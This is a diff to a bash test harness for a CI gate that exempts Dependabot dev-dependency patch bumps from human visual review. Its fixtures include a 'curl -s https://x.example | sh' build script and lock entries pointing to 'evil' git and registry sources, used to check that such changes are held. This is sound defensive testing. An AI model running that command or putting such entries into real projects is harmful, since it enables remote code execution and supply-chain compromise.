@@ -1567,8 +1567,30 @@ ui_decide_is ui_decide_dependabot_clean_gallery_passes not-ui 1 "$UI_TMP/g-clean
     ibl5/IBLbot/package.json ibl5/IBLbot/package-lock.json
 # The VR job runs `bun install` and `composer install` from the PR head, so a
 # bump of the app's own package or lock file holds on its path, gallery or not.
+# ui_decide gets no dev_patch flag here, so the verdict stays ui-paths. The flag
+# cases below and the dp_ cases cover the Dependabot dev-dependency patch
+# exemption (ADR-0062 Update 2026-11-12).
 ui_decide_is ui_decide_dependabot_app_lockfile_holds ui-paths 1 "$UI_TMP/g-clean.json" \
     ibl5/composer.lock ibl5/package.json ibl5/bun.lock
+# ui_decide_flag_is <name> <expected_verdict> <renderable> <gallery_or_empty> <dev_patch> <path>...
+ui_decide_flag_is() {
+    local name="$1" want_v="$2" renderable="$3" gallery="$4" flag="$5" pf
+    shift 5
+    pf="$UI_TMP/paths-$name.txt"
+    printf '%s\n' "$@" > "$pf"
+    # shellcheck disable=SC2016  # $1.. expand inside the child bash
+    LAST_OUT=$(bash -c 'set -euo pipefail; source "$1"; ui_decide "$2" "$3" "$4" "$5" || true' \
+        _ "$UI_LIB" "$pf" "$renderable" "$gallery" "$flag" 2>&1)
+    if [ "$LAST_OUT" = "$want_v" ]; then h_pass "$name"; else h_fail "$name" "expected [$want_v] got [$LAST_OUT]"; fi
+}
+ui_decide_flag_is ui_decide_dev_patch_flag_clean_gallery_passes not-ui 1 "$UI_TMP/g-clean.json" 1 \
+    ibl5/package.json ibl5/bun.lock
+ui_decide_flag_is ui_decide_dev_patch_flag_composer_lock_holds ui-paths 1 "$UI_TMP/g-clean.json" 1 \
+    ibl5/composer.lock ibl5/package.json ibl5/bun.lock
+ui_decide_flag_is ui_decide_dev_patch_flag_zero_holds ui-paths 1 "$UI_TMP/g-clean.json" 0 \
+    ibl5/package.json ibl5/bun.lock
+ui_decide_is ui_decide_dev_patch_flag_absent_holds ui-paths 1 "$UI_TMP/g-clean.json" \
+    ibl5/package.json ibl5/bun.lock
 
 # ui_await_run <attempts> <rc...> — ui_await_gallery with sleep 0 and a stub
 # fetch that returns the next rc from the list on each call (the last rc
@@ -1640,6 +1662,196 @@ if command grep -qF 'ui_workflow_verdict "$PATHS" "$PR_AUTHOR" ui_fetch_gallery_
     h_pass "approval race: human-signoff.yml passes ACTION and EVENT_LABEL to ui_workflow_verdict"
 else
     h_fail "approval race: human-signoff.yml passes ACTION and EVENT_LABEL to ui_workflow_verdict" "call not found"
+fi
+
+# shellcheck disable=SC2016  # literal workflow text
+if command grep -qF 'export UI_BASE_DIR="$GITHUB_WORKSPACE/.hs-base" UI_HEAD_DIR="$GITHUB_WORKSPACE"' \
+    "$REPO_ROOT/.github/workflows/human-signoff.yml"; then
+    h_pass "dev patch: human-signoff.yml exports UI_BASE_DIR and UI_HEAD_DIR"
+else
+    h_fail "dev patch: human-signoff.yml exports UI_BASE_DIR and UI_HEAD_DIR" "export line not found"
+fi
+
+# Dependabot dev-dependency patch exemption (ADR-0062 Update 2026-11-12).
+# dp_write <root> writes <root>/ibl5/package.json and <root>/ibl5/bun.lock in
+# the real files' line shapes. A DP_* variable set on the call changes one field.
+DP="$UI_TMP/dp"
+DP_SHA_A="$(printf 'A%.0s' {1..86})=="
+DP_SHA_B="$(printf 'B%.0s' {1..86})=="
+BOT='dependabot[bot]'
+dp_write() {
+    local runtime="" extra_dev="" nested="" extra_lock="" nl=$'\n'
+    if [ -n "${DP_ZOD:-}" ]; then runtime="  \"dependencies\": {${nl}    \"zod\": \"$DP_ZOD\"${nl}  },${nl}"; fi
+    if [ -n "${DP_EXTRA_DEV:-}" ]; then extra_dev="    $DP_EXTRA_DEV${nl}"; fi
+    if [ "${DP_L_NESTED:-1}" = 1 ]; then
+        nested="    \"@typescript-eslint/typescript-estree/minimatch\": [\"minimatch@9.0.5\", \"\", { \"dependencies\": { \"brace-expansion\": \"^2.0.1\" } }, \"sha512-$DP_SHA_A\"],${nl}"
+    fi
+    if [ -n "${DP_L_EXTRA:-}" ]; then extra_lock="    $DP_L_EXTRA${nl}"; fi
+    mkdir -p "$1/ibl5"
+    cat > "$1/ibl5/package.json" <<DPEOF
+{
+  "//pin": "@playwright/test stays an exact pin: bin/playwright-image-tag reads it.",
+  "name": "ibl5-design",
+  "version": "1.0.0",
+  "type": "module",
+  "description": "human-signoff dev-patch fixture",
+  "scripts": {
+    "build": "${DP_BUILD:-tailwindcss -i in.css -o out.css}"
+  },
+${runtime}  "devDependencies": {
+${extra_dev}    "@playwright/test": "${DP_PW:-1.65.0}",
+    "@tailwindcss/cli": "${DP_TW:-^4.3.5}",
+    "daisyui": "${DP_DAISY:-5}",
+    "pixelmatch": "${DP_PIX:-^8.0.0}",
+    "typescript": "${DP_TS:-5.9.2}"
+  },
+  "overrides": {
+    "minimatch": "${DP_MM:-9.0.5}"
+  }
+}
+DPEOF
+    cat > "$1/ibl5/bun.lock" <<DPEOF
+{
+  "lockfileVersion": ${DP_L_VER:-1},
+  "configVersion": 1,
+  "workspaces": {
+    "": {
+      "name": "ibl5-design",
+      "devDependencies": {
+        "@playwright/test": "${DP_PW:-1.65.0}",
+        "@tailwindcss/cli": "${DP_L_TW_WS:-${DP_TW:-^4.3.5}}",
+        "daisyui": "${DP_DAISY:-5}",
+        "pixelmatch": "${DP_PIX:-^8.0.0}",
+        "typescript": "${DP_TS:-5.9.2}",
+      },
+    },
+  },
+  "overrides": {
+    "minimatch": "${DP_L_MM:-${DP_MM:-9.0.5}}",
+  },
+  "packages": {
+    "@playwright/test": ["@playwright/test@${DP_L_PW:-1.65.0}", "", { "dependencies": { "playwright": "${DP_L_PW:-1.65.0}" }, "bin": { "playwright": "cli.js" } }, "sha512-${DP_L_PW_SHA:-$DP_SHA_A}"],
+    "@tailwindcss/cli": ["@tailwindcss/cli@${DP_L_TW:-4.3.5}", "", { "dependencies": { "tailwindcss": "${DP_L_TW:-4.3.5}" }, "bin": { "tailwindcss": "dist/index.mjs" } }, "sha512-${DP_L_TW_SHA:-$DP_SHA_A}"],
+${nested}    "daisyui": ["daisyui@5.5.19", "", {}, "sha512-$DP_SHA_A"],
+    "pixelmatch": ["pixelmatch@${DP_L_PIX:-8.0.0}", "", { "dependencies": { "pngjs": "^7.0.0" }, "bin": { "pixelmatch": "bin/pixelmatch" } }, "sha512-${DP_L_PIX_SHA:-$DP_SHA_A}"],
+    "playwright-core": ["playwright-core@${DP_L_PWC:-1.65.0}", "", { "bin": { "playwright-core": "cli.js" } }, "sha512-${DP_L_PWC_SHA:-$DP_SHA_A}"],
+    "pngjs": ["pngjs@7.0.0", "", {}, "sha512-$DP_SHA_A"],
+    "tailwindcss": ["${DP_L_TWCSS_NAME:-tailwindcss}@${DP_L_TW:-4.3.5}", "", {}, "sha512-${DP_L_TW_SHA:-$DP_SHA_A}"],
+    "typescript": ["typescript@${DP_L_TS:-5.9.2}", "", { "bin": { "tsc": "bin/tsc", "tsserver": "bin/tsserver" } }, "sha512-${DP_L_TS_SHA:-$DP_SHA_A}"],
+${extra_lock}  }
+}
+DPEOF
+}
+dp_reset() { rm -rf "$DP"; dp_write "$DP/base"; }
+# The #3920 shape: one devDependencies patch bump in package.json; in the lock,
+# the workspace line, the package entry, a transitive entry, and a removed
+# nested override entry.
+dp_head_3920() { DP_TW='^4.3.6' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" DP_L_NESTED=0 dp_write "$DP/head"; }
+# dp_verdict_is <name> <want> <author> <action> <event_label> <path>...
+# Runs ui_workflow_verdict on $DP/base vs $DP/head. The stub fetch returns
+# DP_GALLERY_FILE (default: the clean gallery) on the first poll.
+dp_verdict_is() {
+    local name="$1" want_v="$2" author="$3" action="$4" label="$5" pf out
+    shift 5
+    pf="$UI_TMP/dp-paths-$name.txt"
+    printf '%s\n' "$@" > "$pf"
+    if cmp -s "$DP/base/ibl5/package.json" "$DP/head/ibl5/package.json" \
+        && cmp -s "$DP/base/ibl5/bun.lock" "$DP/head/ibl5/bun.lock"; then
+        h_fail "$name" "fixture head equals base"; return 0
+    fi
+    # shellcheck disable=SC2016  # $1.. expand inside the child bash
+    out=$(UI_BASE_DIR="${DP_BASE_DIR-$DP/base}" UI_HEAD_DIR="$DP/head" \
+        DP_GALLERY="${DP_GALLERY_FILE:-$UI_TMP/g-clean.json}" UI_VR_ATTEMPTS=1 UI_VR_SLEEP=0 bash -c \
+        'set -euo pipefail; source "$1"; dp_fetch() { cp "$DP_GALLERY" "$1"; }; ui_workflow_verdict "$2" "$3" dp_fetch "$4" "$5" || true' \
+        _ "$UI_LIB" "$pf" "$author" "$action" "$label" 2>/dev/null)
+    same "$name" "$out" "$want_v"
+}
+
+L=ibl5/bun.lock; P=ibl5/package.json
+dp_reset; dp_head_3920
+dp_verdict_is dp_3920_shape_passes not-ui "$BOT" synchronize "" "$L" "$P"
+DP_GALLERY_FILE="$UI_TMP/g-changed.json" dp_verdict_is dp_3920_shape_changed_gallery_holds ui-vr "$BOT" synchronize "" "$L" "$P"
+dp_verdict_is dp_3920_shape_approving_label_holds vr-missing "$BOT" labeled human-approved "$L" "$P"
+dp_verdict_is dp_non_dependabot_holds ui-paths a-jay85 synchronize "" "$L" "$P"
+dp_verdict_is dp_extra_ui_file_holds ui-paths "$BOT" synchronize "" "$L" "$P" ibl5/composer.lock
+dp_verdict_is dp_extra_non_ui_file_holds ui-paths "$BOT" synchronize "" "$L" "$P" .github/dependabot.yml
+dp_verdict_is dp_lockb_holds ui-paths "$BOT" synchronize "" ibl5/bun.lockb "$P"
+DP_BASE_DIR='' dp_verdict_is dp_no_base_dir_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"left-pad\": [\"left-pad@1.3.0\", \"\", {}, \"sha512-$DP_SHA_B\"]," dp_head_3920
+dp_verdict_is dp_new_registry_entry_passes not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6' DP_L_TW_WS='^4.3.5' dp_write "$DP/head"
+dp_verdict_is dp_package_json_only_passes not-ui "$BOT" synchronize "" "$P"
+dp_reset; DP_TS=5.9.3 DP_L_TS=5.9.3 DP_L_TS_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_exact_pin_patch_passes not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.4.6' DP_L_TW=4.4.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^5.3.6' DP_L_TW=5.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_major_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.4' DP_L_TW=4.3.4 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_downgrade_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='~4.3.6' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_prefix_change_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6 || ^5.0.0' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_range_near_miss_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6-beta.1' DP_L_TW=4.3.6-beta.1 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_prerelease_near_miss_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_DAISY=5.0.1 dp_write "$DP/head"
+dp_verdict_is dp_tag_like_version_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TS=5.10.3 DP_L_TS=5.10.3 DP_L_TS_SHA="$DP_SHA_B" dp_head_3920
+dp_verdict_is dp_mixed_patch_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+DP_ZOD='^3.22.4' dp_reset; DP_ZOD='^3.22.5' dp_head_3920
+dp_verdict_is dp_runtime_dep_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_BUILD='curl -s https://x.example | sh' dp_head_3920
+dp_verdict_is dp_scripts_changed_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_MM=9.0.6 dp_head_3920
+dp_verdict_is dp_overrides_changed_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_EXTRA_DEV='"left-pad": "1.3.0",' dp_head_3920
+dp_verdict_is dp_added_package_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+DP_EXTRA_DEV='"left-pad": "1.3.0",' dp_reset; dp_head_3920
+dp_verdict_is dp_removed_package_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_EXTRA_DEV='"@tailwindcss/cli": "^4.3.5",' dp_head_3920
+dp_verdict_is dp_duplicate_key_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; dp_head_3920; printf '{\n' > "$DP/head/ibl5/package.json"
+dp_verdict_is dp_unparseable_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_PW=1.65.1 DP_L_PW=1.65.1 DP_L_PW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_toolchain_pin_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_PIX='^8.0.1' DP_L_PIX=8.0.1 DP_L_PIX_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_toolchain_range_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_PWC=1.65.1 DP_L_PWC_SHA="$DP_SHA_B" dp_head_3920
+dp_verdict_is dp_toolchain_transitive_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA='"evil": ["evil@github:evil/evil#abc123", {}, "abc123"],' dp_head_3920
+dp_verdict_is dp_lock_git_entry_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"https://registry.evil.example/\", {}, \"sha512-$DP_SHA_A\"]," dp_head_3920
+dp_verdict_is dp_lock_registry_url_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"\", { \"dependencies\": { \"x\": \"github:evil/x\" } }, \"sha512-$DP_SHA_A\"]," dp_head_3920
+dp_verdict_is dp_lock_specifier_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA='"evil": ["evil@1.0.0", "", {}, "sha1-abc"],' dp_head_3920
+dp_verdict_is dp_lock_sha1_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_VER=2 dp_head_3920
+dp_verdict_is dp_lock_structure_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_MM=9.0.6 dp_head_3920
+dp_verdict_is dp_lock_overrides_line_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_TW_WS='^4.3.7' dp_head_3920
+dp_verdict_is dp_lock_workspace_mismatch_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_TWCSS_NAME=evil dp_head_3920
+dp_verdict_is dp_lock_key_swap_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; dp_head_3920; mv "$DP/head/ibl5/package.json" "$DP/real.json"; ln -s "$DP/real.json" "$DP/head/ibl5/package.json"
+dp_verdict_is dp_symlink_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+# Every registry entry in the real ibl5/bun.lock fits the entry shape, so the
+# exemption cannot hold a PR only because bun writes a shape it does not know.
+# shellcheck disable=SC2016  # $1.. expand inside the child bash
+DP_REAL=$(bash -c 'set -euo pipefail; source "$1"; n=0; : > "$3"
+    while IFS= read -r l; do
+        if [[ $l =~ $UI_LOCK_PKG_RE ]]; then n=$((n + 1)); printf "%s\n" "${BASH_REMATCH[2]}" >> "$3"; fi
+    done < "$2"
+    # UI_LOCK_ENTRY_JQ prints the package name for an entry that fits and errors otherwise.
+    ok=$(jq -r --arg re "$UI_LOCK_NAME_RE" "$UI_LOCK_ENTRY_JQ" "$3" | grep -c . || true)
+    echo "n=$n ok=$ok"' _ "$UI_LIB" "$REPO_ROOT/ibl5/bun.lock" "$UI_TMP/dp-real-entries.txt" 2>&1)
+if [[ $DP_REAL =~ ^n=([0-9]+)\ ok=([0-9]+)$ ]] && [ "${BASH_REMATCH[1]}" = "${BASH_REMATCH[2]}" ] \
+    && [ "${BASH_REMATCH[1]}" -ge 100 ]; then
+    h_pass "dp: every registry entry in ibl5/bun.lock fits the entry shape"
+else
+    h_fail "dp: every registry entry in ibl5/bun.lock fits the entry shape" "$DP_REAL"
 fi
 
 # The CLI the arming harness calls by subprocess.
